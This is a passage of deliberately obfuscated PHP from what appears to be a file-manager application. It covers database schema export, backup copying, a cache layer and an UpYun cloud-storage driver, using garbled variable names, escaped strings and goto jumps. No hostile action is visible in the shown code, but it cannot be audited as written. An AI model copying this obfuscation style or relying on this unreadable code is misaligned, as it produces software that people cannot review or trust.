$ºäËù‡Ç[1114]; $Ş—ƒóÍ¬ = array($ºäËù‡Ç[1120], $„Í¤‹Æ[$ºäËù‡Ç[1118]] == $ºäËù‡Ç[99] && !$¿ûœë¬ö ? $ºäËù‡Ç[1121] : $ºäËù‡Ç[12], $ºäËù‡Ç[1122], $ºäËù‡Ç[1123] . $ë¬ˆóÖú . $ºäËù‡Ç[11] . ($¿ûœë¬ö ? $ºäËù‡Ç[1124] : $„Í¤‹Æ[$ºäËù‡Ç[1117]]) . $ºäËù‡Ç[129], $ºäËù‡Ç[1125], $ºäËù‡Ç[129] . $ë¬ˆóÖú . $ºäËù‡Ç[129], $ºäËù‡Ç[1126] . implode($ºäËù‡Ç[1127], $„Í¤‹Æ[$ºäËù‡Ç[1116]]) . $ºäËù‡Ç[1128]); $ßœËÙï[] = implode($ºäËù‡Ç[53], $Ş—ƒóÍ¬) . $ºäËù‡Ç[81]; } $ŸøªÕÄÊ = array(); $Æ»ªõ“› = array($ºäËù‡Ç[1129] => $ºäËù‡Ç[1130], $ºäËù‡Ç[1130] => $ºäËù‡Ç[1130], $ºäËù‡Ç[296] => $ºäËù‡Ç[323], $ºäËù‡Ç[295] => $ºäËù‡Ç[323]); foreach ($Ğİ’¥¾† as $„Í¤‹Æ) { $Ş—ƒóÍ¬ = array($ºäËù‡Ç[129] . $„Í¤‹Æ[$ºäËù‡Ç[1131]] . $ºäËù‡Ç[129], isset($Æ»ªõ“›[$„Í¤‹Æ[$ºäËù‡Ç[1132]]]) ? $Æ»ªõ“›[$„Í¤‹Æ[$ºäËù‡Ç[1132]]] : $„Í¤‹Æ[$ºäËù‡Ç[1133]], $„Í¤‹Æ[$ºäËù‡Ç[1134]] == $ºäËù‡Ç[910] ? $ºäËù‡Ç[1135] : $ºäËù‡Ç[1136], $„Í¤‹Æ[$ºäËù‡Ç[1131]] == $¤½’ôà ? $ºäËù‡Ç[1137] : $ºäËù‡Ç[12], $„Í¤‹Æ[$ºäËù‡Ç[961]] ? strtoupper(str_replace($ºäËù‡Ç[11], $ºäËù‡Ç[12], $„Í¤‹Æ[$ºäËù‡Ç[961]])) : $ºäËù‡Ç[12]); $ŸøªÕÄÊ[] = trim(implode($ºäËù‡Ç[53], $Ş—ƒóÍ¬)); } $¿¼„½› = array($ºäËù‡Ç[1138] . $ë¬ˆóÖú . $ºäËù‡Ç[1139], $ºäËù‡Ç[1140] . $ë¬ˆóÖú . $ºäËù‡Ç[1141], implode($ºäËù‡Ç[50] . PHP_EOL, $ŸøªÕÄÊ), $ºäËù‡Ç[958]); $úìÊÂí = implode(PHP_EOL, array_merge($¿¼„½›, $ßœËÙï)); if ($’ş®›ªÅ && $’ş®›ªÅ == $ºäËù‡Ç[13]) { return $úìÊÂí; } $ÑêÒñ§¶ = array($ºäËù‡Ç[821] => $æ‘“øÁ¨, $ºäËù‡Ç[13] => $úìÊÂí); return $’ş®›ªÅ ? $ÑêÒñ§¶[$’ş®›ªÅ] : $ÑêÒñ§¶; } public function sqlFromSqlite($á¸ëã‡¶, $–±µâÁÌ = '') { $¦€Å–‹Ê =& $_SERVER[¯µç›È¢]; $¾€êúàØ = $this->model()->db(); $Î—’ÄÃ = "\x50\x52\x41\x47\115\x41\40\x54\101\x42\x4c\x45\x5f\x49\116\106\117\x20\x28\x27{$á¸ëã‡¶}\x27\51"; $è§íÌá = "\123\x45\114\105\x43\x54\x20\x2a\40\106\x52\x4f\x4d\40\x73\161\x6c\x69\x74\145\x5f\x6d\141\x73\x74\x65\162\40\127\x48\x45\122\105\40\164\142\154\x5f\156\141\155\x65\40\75\40\47{$á¸ëã‡¶}\x27"; $‰Ñ½ƒöœ = $¾€êúàØ->query($Î—’ÄÃ); if (empty($‰Ñ½ƒöœ)) { $­½‹¹ÓÍ = array($¦€Å–‹Ê[821] => $¦€Å–‹Ê[12], $¦€Å–‹Ê[13] => $¦€Å–‹Ê[12]); return $–±µâÁÌ ? $­½‹¹ÓÍ[$–±µâÁÌ] : $­½‹¹ÓÍ; } $¨½Òå·˜ = $¾€êúàØ->query($è§íÌá); $Š×İÊ = $¡ß¥âóš = array(); foreach ($¨½Òå·˜ as $¼òà´•») { if ($¼òà´•»[$¦€Å–‹Ê[33]] == $¦€Å–‹Ê[287]) { $Š×İÊ[] = $¼òà´•»[$¦€Å–‹Ê[1142]]; } else { $¡ß¥âóš[$¼òà´•»[$¦€Å–‹Ê[32]]] = $¼òà´•»[$¦€Å–‹Ê[1142]]; } } $ĞÆÙô¨ú = array_merge(array($¦€Å–‹Ê[1138] . $á¸ëã‡¶ . $¦€Å–‹Ê[129]), $Š×İÊ, array_values($¡ß¥âóš)); $ĞÆÙô¨ú = implode($¦€Å–‹Ê[81] . PHP_EOL, $ĞÆÙô¨ú) . $¦€Å–‹Ê[81]; if ($–±µâÁÌ && $–±µâÁÌ == $¦€Å–‹Ê[13]) { return $ĞÆÙô¨ú; } $­ö’‹¼Ö = array(); $‰åØ¬ü = array($¦€Å–‹Ê[1130] => $¦€Å–‹Ê[1143], $¦€Å–‹Ê[323] => $¦€Å–‹Ê[1144]); $¸Ò–ÔœÙ = $¦€Å–‹Ê[12]; foreach ($‰Ñ½ƒöœ as $¼òà´•») { if ($¼òà´•»[$¦€Å–‹Ê[57]] == $¦€Å–‹Ê[99]) { $¸Ò–ÔœÙ = $¼òà´•»[$¦€Å–‹Ê[32]]; } $¯ËíääĞ = array($¦€Å–‹Ê[393] . $¼òà´•»[$¦€Å–‹Ê[32]] . $¦€Å–‹Ê[393], isset($‰åØ¬ü[$¼òà´•»[$¦€Å–‹Ê[33]]]) ? $‰åØ¬ü[$¼òà´•»[$¦€Å–‹Ê[33]]] : $¼òà´•»[$¦€Å–‹Ê[33]], $¼òà´•»[$¦€Å–‹Ê[35]] == $¦€Å–‹Ê[99] ? $¦€Å–‹Ê[1135] : $¦€Å–‹Ê[1145] . $¼òà´•»[$¦€Å–‹Ê[56]], $¼òà´•»[$¦€Å–‹Ê[57]] == $¦€Å–‹Ê[99] ? $¦€Å–‹Ê[1146] : $¦€Å–‹Ê[12]); $­ö’‹¼Ö[] = trim(implode($¦€Å–‹Ê[53], $¯ËíääĞ)); } foreach ($¡ß¥âóš as $‰ÇÜŸ€¼ => $¢‰áò÷ñ) { $„‹Ò«¥Â = str_replace($¦€Å–‹Ê[1147] . $á¸ëã‡¶ . $¦€Å–‹Ê[11], $¦€Å–‹Ê[12], $‰ÇÜŸ€¼); $…Œ¯úÑÒ = str_replace(array($¦€Å–‹Ê[129], $¦€Å–‹Ê[969]), $¦€Å–‹Ê[393], substr($¢‰áò÷ñ, stripos($¢‰áò÷ñ, $¦€Å–‹Ê[268]))); if ($„‹Ò«¥Â == $¦€Å–‹Ê[1124]) { $¬¨›ø´™ = $¦€Å–‹Ê[1148] . $¸Ò–ÔœÙ . $¦€Å–‹Ê[1149]; } else { $¬¨›ø´™ = (stripos($„‹Ò«¥Â, $¦€Å–‹Ê[11]) ? $¦€Å–‹Ê[1150] : $¦€Å–‹Ê[12]) . ($¦€Å–‹Ê[1151] . $„‹Ò«¥Â . $¦€Å–‹Ê[1152] . $…Œ¯úÑÒ); } $­ö’‹¼Ö[] = $¬¨›ø´™; } $¨ÙƒğÎ = array($¦€Å–‹Ê[1153] . $á¸ëã‡¶ . $¦€Å–‹Ê[1154], $¦€Å–‹Ê[1155] . $á¸ëã‡¶ . $¦€Å–‹Ê[1156], implode($¦€Å–‹Ê[50] . PHP_EOL, $­ö’‹¼Ö), $¦€Å–‹Ê[1157]); $“åğøÏ = implode(PHP_EOL, $¨ÙƒğÎ); if ($–±µâÁÌ && $–±µâÁÌ == $¦€Å–‹Ê[821]) { return $“åğøÏ; } $­½‹¹ÓÍ = array($¦€Å–‹Ê[821] => $“åğøÏ, $¦€Å–‹Ê[13] => $ĞÆÙô¨ú); return $–±µâÁÌ ? $­½‹¹ÓÍ[$–±µâÁÌ] : $­½‹¹ÓÍ; } } goto bœÏÑ¡ ò…; aÃéøâí¹: class BackupDbFile { public function __construct() { } public function index() { $êâÑÅ“ü =& $_SERVER[¯µç›È¢]; $ÖÊ‹‹Æò = Backup::get(); $¶æ‚˜ƒú = $ÖÊ‹‹Æò[$êâÑÅ“ü[32]]; $‘Õ­„Ï = $this->tmpFilesPath() . "\142\x61\x63\x6b\165\160\x5f{$¶æ‚˜ƒú}\57"; $îå’é÷‘ = $this->backupPath($ÖÊ‹‹Æò); if (!($îå’é÷‘ = IO::mkdir($îå’é÷‘))) { return !1; } $°ÎêõĞı = IO::listPath($‘Õ­„Ï); $±‚¦—÷é = isset($°ÎêõĞı[$êâÑÅ“ü[86]]) ? $°ÎêõĞı[$êâÑÅ“ü[86]] : array(); $˜¬Ïï‚ª = array_sum(array_column($±‚¦—÷é, $êâÑÅ“ü[90])); if (!$˜¬Ïï‚ª) { return !1; } $Ã›€¦ı = array($êâÑÅ“ü[815] => $˜¬Ïï‚ª, $êâÑÅ“ü[816] => time()); Backup::set($Ã›€¦ı); $–İìµüÀ = new TaskFileTransfer($êâÑÅ“ü[817], $êâÑÅ“ü[797], count($±‚¦—÷é), LNG($êâÑÅ“ü[798]) . $êâÑÅ“ü[465] . LNG($êâÑÅ“ü[800]) . $êâÑÅ“ü[818]); $–İìµüÀ->task[$êâÑÅ“ü[780]] = $˜¬Ïï‚ª; foreach ($°ÎêõĞı[$êâÑÅ“ü[86]] as $üË‰Ø™û) { $¿Õ³ŞÜç = IO::move($üË‰Ø™û[$êâÑÅ“ü[88]], $îå’é÷‘); if (!$¿Õ³ŞÜç) { $–İìµüÀ->end(); $ÁïûÔç = IO::getLastError($êâÑÅ“ü[819] . $üË‰Ø™û[$êâÑÅ“ü[88]] . $êâÑÅ“ü[820] . $îå’é÷‘ . $êâÑÅ“ü[541]); write_log($ÁïûÔç, $êâÑÅ“ü[797]); return !1; } } $éØ«Ğè = new DbManage(); $ùËó•Ş’ = $éØ«Ğè->getSqlFile(); if (!$ùËó•Ş’[$êâÑÅ“ü[821]] || !$ùËó•Ş’[$êâÑÅ“ü[13]]) { return !1; } IO::move($ùËó•Ş’[$êâÑÅ“ü[821]], $îå’é÷‘); IO::move($ùËó•Ş’[$êâÑÅ“ü[13]], $îå’é÷‘); $–İìµüÀ->end(); $Ã›€¦ı = array($êâÑÅ“ü[822] => $˜¬Ïï‚ª, $êâÑÅ“ü[823] => time()); Backup::set($Ã›€¦ı); return !0; } private function backupPath($â‹¿šî•) { $™‡›ï–Ï =& $_SERVER[¯µç›È¢]; $İñ…µŸ = $â‹¿šî•[$™‡›ï–Ï[32]]; $–¨¿­Ï¥ = Model($™‡›ï–Ï[787])->get($™‡›ï–Ï[788]); $öşÅ¨± = substr(md5($™‡›ï–Ï[789] . $–¨¿­Ï¥ . $İñ…µŸ), 0, 8); return "\173\x69\x6f\x3a{$â‹¿šî•[$™‡›ï–Ï[769]]}\175\57\144\x61\164\x61\142\141\163\145\x2f\x62\x61\143\153\165\160\x2f" . $İñ…µŸ . $™‡›ï–Ï[11] . $öşÅ¨±; } private function tmpFilesPath() { $‰ÓãÇË˜ =& $_SERVER[¯µç›È¢]; $Úµû“ÕÊ = TEMP_FILES; if ($GLOBALS[$‰ÓãÇË˜[6]][$‰ÓãÇË˜[100]][$‰ÓãÇË˜[813]]) { $Úµû“ÕÊ = $GLOBALS[$‰ÓãÇË˜[6]][$‰ÓãÇË˜[100]][$‰ÓãÇË˜[813]]; if (!mk_dir($Úµû“ÕÊ) || !is_writable($Úµû“ÕÊ) || !IO::mkfile($Úµû“ÕÊ . $‰ÓãÇË˜[814])) { $Úµû“ÕÊ = TEMP_FILES; } } return $Úµû“ÕÊ; } } class BackupFile { public function __construct() { } public function index() { $Øòù”òÉ = Backup::get(); $üš´æÃ = $Øòù”òÉ[$_SERVER[¯µç›È¢][301]][$_SERVER[¯µç›È¢][206]][$_SERVER[¯µç›È¢][472]]; $Ï–İ¸ = array($_SERVER[¯µç›È¢][473] => array($_SERVER[¯µç›È¢][824], $üš´æÃ), $_SERVER[¯µç›È¢][825] => array($_SERVER[¯µç›È¢][339], $Øòù”òÉ[$_SERVER[¯µç›È¢][769]])); $Ûôûäë = (int) Model($_SERVER[¯µç›È¢][806])->where($Ï–İ¸)->count($_SERVER[¯µç›È¢][472]); $¼¢ç‰‹’ = (int) Model($_SERVER[¯µç›È¢][806])->where($Ï–İ¸)->sum($_SERVER[¯µç›È¢][90]); $ ˜©”ªÌ = new TaskFileTransfer($_SERVER[¯µç›È¢][826], $_SERVER[¯µç›È¢][797], $Ûôûäë, LNG($_SERVER[¯µç›È¢][798]) . $_SERVER[¯µç›È¢][799] . LNG($_SERVER[¯µç›È¢][827])); $ ˜©”ªÌ->task[$_SERVER[¯µç›È¢][780]] = $¼¢ç‰‹’; $ñò²ğ±ß = array($_SERVER[¯µç›È¢][828] => $Ûôûäë, $_SERVER[¯µç›È¢][829] => $¼¢ç‰‹’, $_SERVER[¯µç›È¢][830] => time()); Backup::set($ñò²ğ±ß); $ÏŒÄûœ½ = !0; $ëšäŒ§Ç = $this->storeIds(); $‡Â÷üÕÖ = 1; $Ù¯óÙ = 1000; $œïîõ¾Ğ = $ğßÒ…°ô = 0; $¨ÜºÛÔÄ = array(); $†ª…ÅÔª = $´úËµä¨ = 0; do { $—‡Ã¬­ = $_SERVER[¯µç›È¢][831]; $Ô‡÷ú’¨ = Model($_SERVER[¯µç›È¢][806])->where($Ï–İ¸)->field($—‡Ã¬­)->order($_SERVER[¯µç›È¢][832])->selectPage($Ù¯óÙ, $‡Â÷üÕÖ); $ñ‹Ñµ¡ğ = !empty($Ô‡÷ú’¨[$_SERVER[¯µç›È¢][377]]) ? $Ô‡÷ú’¨[$_SERVER[¯µç›È¢][377]] : array(); foreach ($ñ‹Ñµ¡ğ as $©•°«Â™) { if (!$this->_fileExist($©•°«Â™, $¨ÜºÛÔÄ, $ëšäŒ§Ç)) { $Ûôûäë -= 1; $¼¢ç‰‹’ -= (int) $©•°«Â™[$_SERVER[¯µç›È¢][90]]; write_log("\146\x69\x6c\x65\40\x6e\157\x74\x20\x65\x78\x69\163\164\56\146\151\154\145\x49\104\x3a{$©•°«Â™[$_SERVER[¯µç›È¢][472]]}\x2c\40\160\x61\164\150\72{$©•°«Â™[$_SERVER[¯µç›È¢][88]]}", $_SERVER[¯µç›È¢][833]); continue; } $‡à€´¿¼ = $©•°«Â™[$_SERVER[¯µç›È¢][88]]; $ëÒ”à è = "\x7b\151\x6f\x3a{$Øòù”òÉ[$_SERVER[¯µç›È¢][769]]}\x7d" . substr($‡à€´¿¼, strlen("\173\x69\157\72{$©•°«Â™[$_SERVER[¯µç›È¢][834]]}\x7d")); if (IO::exist($ëÒ”à è)) { $ ˜©”ªÌ->updateFileEnd($©•°«Â™[$_SERVER[¯µç›È¢][32]], $©•°«Â™[$_SERVER[¯µç›È¢][90]]); } else { $ëÒ”à è = get_path_father($ëÒ”à è); IO::mkdir($ëÒ”à è); if (!IO::copy($‡à€´¿¼, $ëÒ”à è, $_SERVER[¯µç›È¢][835])) { write_log($_SERVER[¯µç›È¢][836] . $‡à€´¿¼ . $_SERVER[¯µç›È¢][820] . $ëÒ”à è . $_SERVER[¯µç›È¢][541], $_SERVER[¯µç›È¢][797]); $ÏŒÄûœ½ = !1; break; } } $üš´æÃ = $©•°«Â™[$_SERVER[¯µç›È¢][472]]; $ğßÒ…°ô += 1; $œïîõ¾Ğ += $©•°«Â™[$_SERVER[¯µç›È¢][90]]; $´úËµä¨ += 1; $†ª…ÅÔª += $©•°«Â™[$_SERVER[¯µç›È¢][90]]; if ($œïîõ¾Ğ >= 1024 * 1024 * 100) { $ñò²ğ±ß = array($_SERVER[¯µç›È¢][837] => $üš´æÃ, $_SERVER[¯µç›È¢][838] => $´úËµä¨, $_SERVER[¯µç›È¢][839] => $†ª…ÅÔª); Backup::set($ñò²ğ±ß); $œïîõ¾Ğ = $ğßÒ…°ô = 0; } } $¹ö÷ä» = count($ñ‹Ñµ¡ğ); $‡Â÷üÕÖ++; } while ($¹ö÷ä» == $Ù¯óÙ); $ ˜©”ªÌ->end(); $ñò²ğ±ß = array($_SERVER[¯µç›È¢][840] => 1, $_SERVER[¯µç›È¢][501] => time(), $_SERVER[¯µç›È¢][792] => 1, $_SERVER[¯µç›È¢][837] => $üš´æÃ, $_SERVER[¯µç›È¢][829] => $¼¢ç‰‹’, $_SERVER[¯µç›È¢][828] => $Ûôûäë, $_SERVER[¯µç›È¢][841] => time()); if ($ğßÒ…°ô) { $ñò²ğ±ß[$_SERVER[¯µç›È¢][838]] = $´úËµä¨; $ñò²ğ±ß[$_SERVER[¯µç›È¢][839]] = $†ª…ÅÔª; } Backup::set($ñò²ğ±ß); $this->_fileFilter($¨ÜºÛÔÄ); return !0; } private function _fileExist($©ùª¯Â­, &$·Óî×Š—, $Å§§§½Ø) { $æ×§Û«¨ =& $_SERVER[¯µç›È¢]; $Êï¶™È« = $©ùª¯Â­[$æ×§Û«¨[88]]; if (in_array($©ùª¯Â­[$æ×§Û«¨[472]], $·Óî×Š—)) { return !1; } if (!in_array($©ùª¯Â­[$æ×§Û«¨[834]], $Å§§§½Ø)) { return !1; } if (IO::exist($Êï¶™È«)) { return !0; } $•¢’™õ´ = get_path_father($Êï¶™È«); if (IO::exist($•¢’™õ´)) { $·Óî×Š—[] = $©ùª¯Â­[$æ×§Û«¨[472]]; return !1; } $Ÿ­Ü½¼ = array($æ×§Û«¨[834] => $©ùª¯Â­[$æ×§Û«¨[834]], $æ×§Û«¨[88] => array($æ×§Û«¨[391], "{$•¢’™õ´}\x25")); $¬ÅáŸ¬œ = Model($æ×§Û«¨[806])->where($Ÿ­Ü½¼)->field($æ×§Û«¨[473])->select(); $·Óî×Š— = array_merge($·Óî×Š—, array_to_keyvalue($¬ÅáŸ¬œ, $æ×§Û«¨[12], $æ×§Û«¨[472])); return !1; } private function _fileFilter($ìãä¤çƒ) { $äì¶°‰å =& $_SERVER[¯µç›È¢]; if (empty($ìãä¤çƒ)) { return; } $¯½îâÎ = array($äì¶°‰å[472] => array($äì¶°‰å[7], array_unique($ìãä¤çƒ))); $ÙÂÃãÏ = Model($äì¶°‰å[842])->where($¯½îâÎ)->field($äì¶°‰å[408])->select(); foreach ($ÙÂÃãÏ as $îá—¿Ÿ) { Model($äì¶°‰å[842])->remove($îá—¿Ÿ[$äì¶°‰å[408]], !1); } } private function storeIds() { $–Ä½òã =& $_SERVER[¯µç›È¢]; $ë‚Óø™¸ = Model($–Ä½òã[784])->listData(); $¢ã²İòƒ = array(); $œğĞ = $GLOBALS[$–Ä½òã[6]][$–Ä½òã[100]][$–Ä½òã[843]]; foreach ($ë‚Óø™¸ as $£°µªüœ) { $¥šÅŸº’ = strtolower($£°µªüœ[$–Ä½òã[106]]); if (!isset($œğĞ[$¥šÅŸº’])) { continue; } $è™ÛãıĞ = $–Ä½òã[84] . (isset($œğĞ[$¥šÅŸº’]) ? $œğĞ[$¥šÅŸº’] : ucfirst($¥šÅŸº’)); if (!class_exists($è™ÛãıĞ)) { continue; } $¢ã²İòƒ[] = $£°µªüœ[$–Ä½òã[405]]; } return $¢ã²İòƒ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÙÛÏ» =& $_SERVER[¯µç›È¢]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‡®ÎãÑã = $GLOBALS[$ÙÛÏ»[6]][$ÙÛÏ»[357]]; $ä¦Ï¯† = $‡®ÎãÑã[$‡®ÎãÑã[$ÙÛÏ»[844]]]; $“¦İÍí¡ = $‡®ÎãÑã[$ÙÛÏ»[845]]; switch ($‡®ÎãÑã[$ÙÛÏ»[844]]) { case $ÙÛÏ»[21]: self::$handle = Model($ÙÛÏ»[846]); break; case $ÙÛÏ»[847]: self::$handle = new CacheRedis($ä¦Ï¯†, $“¦İÍí¡); break; case $ÙÛÏ»[848]: self::$handle = new CacheMemcached($ä¦Ï¯†, $“¦İÍí¡); break; case $ÙÛÏ»[206]: self::$handle = new CacheFile($ä¦Ï¯†, $“¦İÍí¡); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¯‹Ğó) { if (is_array($¯‹Ğó) || is_object($¯‹Ğó)) { $¯‹Ğó = json_encode($¯‹Ğó); } $¯‹Ğó = rawurlencode($¯‹Ğó); return md5(KOD_SITE_ID . $_SERVER[¯µç›È¢][11] . $¯‹Ğó); } public static function get($Šœä™öù, $×ùèçµ = false) { $ğ„§ù = self::key($Šœä™öù); if ($×ùèçµ) { return unserialize(self::init()->get($ğ„§ù)); } if (!isset(self::$memoryCache[$ğ„§ù])) { $¡¶â¹Ñ = self::init()->get($ğ„§ù); self::$memoryCache[$ğ„§ù] = unserialize($¡¶â¹Ñ); } return self::$memoryCache[$ğ„§ù]; } public static function set($±“Øã•», $ËÓ¬·ğé, $Â²•©È¨ = false) { $²¾©Šñê = self::key($±“Øã•»); if (isset(self::$memoryCache[$²¾©Šñê]) && self::$memoryCache[$²¾©Šñê] === $ËÓ¬·ğé) { return !0; } if ($Â²•©È¨ === 0) { self::$memoryCache[$²¾©Šñê] = $ËÓ¬·ğé; return !0; } CacheLock::lock($±“Øã•»); $¥¤ƒÕ¹¿ = self::init()->set($²¾©Šñê, serialize($ËÓ¬·ğé), $Â²•©È¨); self::$memoryCache[$²¾©Šñê] = $ËÓ¬·ğé; CacheLock::unlock($±“Øã•»); return $¥¤ƒÕ¹¿; } public static function getCall($²«Í™Ò¬, $Ä“•âÓŒ, $¹—Ãƒ, $Ñôş€”À = array()) { $‡·¯ªâ =& $_SERVER[¯µç›È¢]; $¯ŸıÑè = self::get($²«Í™Ò¬); if ($¯ŸıÑè || $¯ŸıÑè === $‡·¯ªâ[12]) { return $¯ŸıÑè; } $¯ŸıÑè = call_user_func_array($¹—Ãƒ, $Ñôş€”À); $¯ŸıÑè = $¯ŸıÑè ? $¯ŸıÑè : $‡·¯ªâ[12]; self::set($²«Í™Ò¬, $¯ŸıÑè, $Ä“•âÓŒ); return $¯ŸıÑè; } public static function remove($ô¸¤ÎÜà) { $—©øí¿§ = self::key($ô¸¤ÎÜà); unset(self::$memoryCache[$—©øí¿§]); self::clearTimeout(); CacheLock::lock($ô¸¤ÎÜà); $ÓĞÊÚ¤¹ = self::init()->remove($—©øí¿§); CacheLock::unlock($ô¸¤ÎÜà); return $ÓĞÊÚ¤¹; } public static function removeMemory($şù¡•§Ì) { $Ê•ºˆ¼­ = self::key($şù¡•§Ì); unset(self::$memoryCache[$Ê•ºˆ¼­]); } public static function clearMemory($†ÇÏö¡¶ = false) { if ($†ÇÏö¡¶) { $†ÇÏö¡¶ = self::key($†ÇÏö¡¶); unset(self::$memoryCache[$†ÇÏö¡¶]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¯µç›È¢][849])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¯µç›È¢][850])) { self::init()->clearTimeout(); } } } goto B¡ë„ŒÁ§; aÃ¨ ª®¬: define($_SERVER[¯µç›È¢][246], 1); define($_SERVER[¯µç›È¢][247], 2); define($_SERVER[¯µç›È¢][248], 3); goto cñ™§¶Å–; Fë„’Š¨­Ğ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Íö¥ÉÓ, $Ñ½¾Ù°Š = 0) { parent::__construct(); $this->source = $Íö¥ÉÓ; $this->sourceSize = $Ñ½¾Ù°Š; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($­šƒ×÷À = false) { return $this->sourceSize; } public function getContent($œÑ¿ÒÉ = false) { return $this->fileSubstr($œÑ¿ÒÉ, 0, $this->sourceSize); } public function fileSubstr($“› ‘­¬ = false, $Æ¤ˆĞ = 0, $ñ‚Şè = 0) { if (!$ñ‚Şè) { $ñ‚Şè = $this->sourceSize; } $ùËŠü¾È = $this->sourceSize - $Æ¤ˆĞ; if ($ñ‚Şè >= $ùËŠü¾È) { $ñ‚Şè = $ùËŠü¾È; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Æ¤ˆĞ, $ñ‚Şè); } if ($this->sourceType == self::TYPE_FILE) { if ($ñ‚Şè <= 0) { return $_SERVER[¯µç›È¢][12]; } $ŒåÚ³ó = ftell($this->source); fseek_64($this->source, $ŒåÚ³ó + $Æ¤ˆĞ); $ªÊÒÛÆ = @fread($this->source, $ñ‚Şè); fseek_64($this->source, $ŒåÚ³ó); return $ªÊÒÛÆ; } } public function hashMd5($ÙàÁàÈä = false) { return md5($this->getContent()); } public static function hash($Úµšš¡¯, $§–²Ï = 0) { $ßè©ıı½ = new PathDriverStream($Úµšš¡¯, $§–²Ï); return $ßè©ıı½->hashSimple($Úµšš¡¯); } public static function md5($àĞ…¹Æ‡, $‹Ÿ‡§î£ = 0) { $¦Û±ÄöÜ = new PathDriverStream($àĞ…¹Æ‡, $‹Ÿ‡§î£); return $¦Û±ÄöÜ->hashMd5($àĞ…¹Æ‡); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\72\57\57\166\60\56\x61\160\151\x2e\165\160\x79\x75\156\x2e\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($„¾ÀŒ¹Ã) { parent::__construct(); $this->_init($„¾ÀŒ¹Ã); } public function _init($Ñİü®®ö) { $Ëå¢“éœ =& $_SERVER[¯µç›È¢]; foreach ($Ñİü®®ö as $†£•ÆÏ => $šşéÔ) { if (isset($this->{$†£•ÆÏ})) { $this->{$†£•ÆÏ} = $šşéÔ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ëå¢“éœ[1463] . LNG($Ëå¢“éœ[1394])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Õê¬ÁçŠ, $¶Ô¹§›½ = "\107\105\x54") { $ÑıèÀúü =& $_SERVER[¯µç›È¢]; $İı‡““ = gmdate($ÑıèÀúü[1427]); $òÎ²ØÈ = base64_encode(hash_hmac($ÑıèÀúü[1464], "{$¶Ô¹§›½}\46{$Õê¬ÁçŠ}\46{$İı‡““}", md5("{$this->userpass}"), !0)); $¸”®Ú … = array("\101\x75\164\150\x6f\162\x69\x7a\141\x74\151\157\156\72\125\x50\x59\125\x4e\x20{$this->username}\x3a{$òÎ²ØÈ}", "\x44\141\164\x65\72{$İı‡““}"); return $¸”®Ú …; } public function ussRequest($‚·‚é·, $›Ø­ª™¢ = "\x47\105\x54", $¾™¶Ú»¾ = false, $éìø¬“ó = false, $©²å†£¼ = false) { $¸­¡¢º =& $_SERVER[¯µç›È¢]; $‚·‚é· = trim($‚·‚é·, $¸­¡¢º[8]); $ÉŠ‹ı¡» = "\x2f{$this->bucket}\57{$‚·‚é·}"; $î‡Ûµ¢Ş = $this->ussHeaders($ÉŠ‹ı¡», $›Ø­ª™¢); if ($éìø¬“ó) { $î‡Ûµ¢Ş = array_merge($î‡Ûµ¢Ş, $éìø¬“ó); } $·×ô«Êã = url_request($this->endpoint . $ÉŠ‹ı¡», $›Ø­ª™¢, $¾™¶Ú»¾, $î‡Ûµ¢Ş, $©²å†£¼); if (!$·×ô«Êã) { return array($¸­¡¢º[1201] => !1, $¸­¡¢º[1203] => $¸­¡¢º[1465]); } if (strtolower($›Ø­ª™¢) == $¸­¡¢º[203] || in_array($·×ô«Êã[$¸­¡¢º[1201]], array($¸­¡¢º[1320], $¸­¡¢º[1466]))) { $¾™¶Ú»¾ = $·×ô«Êã[$¸­¡¢º[1467]]; } else { $¾™¶Ú»¾ = json_decode($·×ô«Êã[$¸­¡¢º[1203]], !0); if (!$¾™¶Ú»¾) { $¾™¶Ú»¾ = $·×ô«Êã[$¸­¡¢º[1203]]; } else { if (!$·×ô«Êã[$¸­¡¢º[767]] && isset($¾™¶Ú»¾[$¸­¡¢º[1468]])) { $¾™¶Ú»¾ = $¾™¶Ú»¾[$¸­¡¢º[1468]]; } } } return array($¸­¡¢º[1201] => $·×ô«Êã[$¸­¡¢º[767]], $¸­¡¢º[1203] => $¾™¶Ú»¾); } public function mkfile($ù­–Û, $³çĞ¯†„ = '', $è‰€¢è = REPEAT_RENAME) { if ($this->setContent($ù­–Û, $³çĞ¯†„)) { return $this->getPathOuter($ù­–Û); } return !1; } public function mkdir($»ß¶èÂ, $Ì´à‰ÍŞ = REPEAT_SKIP) { $ïù“ó’Ù =& $_SERVER[¯µç›È¢]; $ÑŒñáÅå = trim($»ß¶èÂ, $ïù“ó’Ù[8]); if ($this->_isFolder($ÑŒñáÅå)) { return $this->getPathOuter($ÑŒñáÅå); } $ŒÂ¨øªÊ = array($ïù“ó’Ù[1469]); $œöŸì§Ô = $this->ussRequest($ÑŒñáÅå, $ïù“ó’Ù[235], !1, $ŒÂ¨øªÊ); return $œöŸì§Ô[$ïù“ó’Ù[1201]] ? $this->getPathOuter($ÑŒñáÅå) : !1; } public function copyFile($ùìÄõ, $Éó‡ßù) { $èÙö®ùÕ =& $_SERVER[¯µç›È¢]; $ãú•ÍÇî = array($èÙö®ùÕ[1470] . "\57{$this->bucket}\x2f{$ùìÄõ}", $èÙö®ùÕ[1471]); $‰ß»¿ª² = $this->ussRequest($Éó‡ßù, $èÙö®ùÕ[237], !1, $ãú•ÍÇî); return $‰ß»¿ª²[$èÙö®ùÕ[1201]] ? !0 : $this->getPathOuter($Éó‡ßù); } public function moveFile($Ÿäå©ÅÙ, 